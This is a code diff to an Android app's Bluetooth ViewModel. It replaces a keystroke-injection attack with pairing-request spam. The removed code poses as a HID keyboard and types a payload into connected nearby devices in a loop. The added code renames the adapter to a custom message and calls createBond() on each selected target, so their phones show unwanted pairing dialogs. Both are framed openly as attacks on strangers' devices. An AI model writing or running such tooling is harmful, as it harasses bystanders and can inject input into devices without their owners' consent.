@@ -25,6 +25,7 @@ sealed class HidState {
 class BluetoothHidViewModel : ViewModel() {
 
     internal val discoveryManager = BluetoothDiscoveryManager()
+    internal val pairingSpammer = BluetoothPairingSpammer()
     internal val hidManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
         BluetoothHidManager()
     } else null
@@ -127,67 +128,52 @@ class BluetoothHidViewModel : ViewModel() {
         _selectedTargetsFlow.value = targets
     }
 
-    // ---- Attack control (uses already-discovered + selected devices) ----
+    // ---- Attack control: pairing request spam ----
+    // Sets adapter name to custom message, then calls createBond() on each target.
+    // Target phones see a pairing dialog with the custom name = your message.
 
     fun startAttack(context: Context) {
         if (_state.value is HidState.Scanning || _state.value is HidState.Attacking) return
 
-        val profile = selectedProfile.value ?: DeviceProfiles.DEFAULT
-        val name = customDeviceName.value
+        val name = customDeviceName.value ?: payload.value ?: "Hello"
         val targets = selectedTargets.value ?: emptySet()
 
         if (targets.isEmpty()) return
 
-        // Stop scanning if active — we're switching to HID mode
+        // Stop scanning if active
         if (_isScanning.value == true) {
             stopScan(context)
         }
 
-        _state.value = HidState.Scanning
-        _connectedCount.value = 0
+        _state.value = HidState.Attacking(0)
+        _connectedCount.value = targets.size
         _keystrokesSent.value = 0
 
-        // Register HID profile with selected device profile
-        hidManager?.register(context, profile, name)
+        try {
+            val discoveredList = _discoveredDevices.value ?: emptyList()
+            pairingSpammer.start(context, name, targets, discoveredList)
 
-        // Connect HID to selected targets from already-discovered devices
-        val discoveredList = _discoveredDevices.value ?: emptyList()
-        discoveredList.filter { targets.contains(it.address) }.forEach { device ->
-            hidManager?.connect(device)
-        }
-
-        // Transition to Attacking once we attempt connections
-        if (targets.isNotEmpty()) {
-            _state.value = HidState.Attacking(0)
-        }
-
-        // Observe HID connected count
-        connectedObserverJob = viewModelScope.launch {
-            hidManager?.connectedDevices?.collect { connected ->
-                _connectedCount.postValue(connected.size)
-                if (_state.value is HidState.Attacking || _state.value is HidState.Scanning) {
-                    _state.postValue(HidState.Attacking(connected.size))
+            // Observe connection attempt counter
+            connectedObserverJob = viewModelScope.launch {
+                pairingSpammer.connectionAttempts.collect { count ->
+                    _keystrokesSent.postValue(count)
+                    _state.postValue(HidState.Attacking(targets.size))
                 }
             }
-        }
 
-        // Observe keystroke counter
-        keystrokeObserverJob = viewModelScope.launch {
-            hidManager?.keystrokesSent?.collect { count ->
-                _keystrokesSent.postValue(count)
-            }
-        }
-
-        // Attack loop: send keystrokes to connected devices periodically
-        attackLoopJob = viewModelScope.launch {
-            while (true) {
-                delay(cycleDelayMs)
-                val currentPayload = payload.value ?: "Hello from your keyboard!\n"
-                val connected = hidManager?.connectedDevices?.value ?: emptySet()
-                connected.forEach { device ->
-                    hidManager?.sendText(device, currentPayload)
+            // Observe errors
+            errorObserverJob = viewModelScope.launch {
+                pairingSpammer.lastError.collect { error ->
+                    if (error != null) {
+                        _state.postValue(HidState.Error(error))
+                    }
                 }
             }
+
+            CrashLogger.log(context, "BtAttack", "Pairing spam started: name='$name' targets=${targets.size}")
+        } catch (e: Exception) {
+            CrashLogger.log(context, "BtAttack", "startAttack crashed: ${e.message}", e)
+            _state.value = HidState.Error("Attack failed: ${e.message}")
         }
     }
 
@@ -199,9 +185,9 @@ class BluetoothHidViewModel : ViewModel() {
         connectedObserverJob?.cancel()
         keystrokeObserverJob?.cancel()
         attackLoopJob?.cancel()
+        errorObserverJob?.cancel()
 
-        hidManager?.disconnectAll()
-        hidManager?.unregister(context)
+        pairingSpammer.stop(context)
 
         _state.value = HidState.Idle
     }
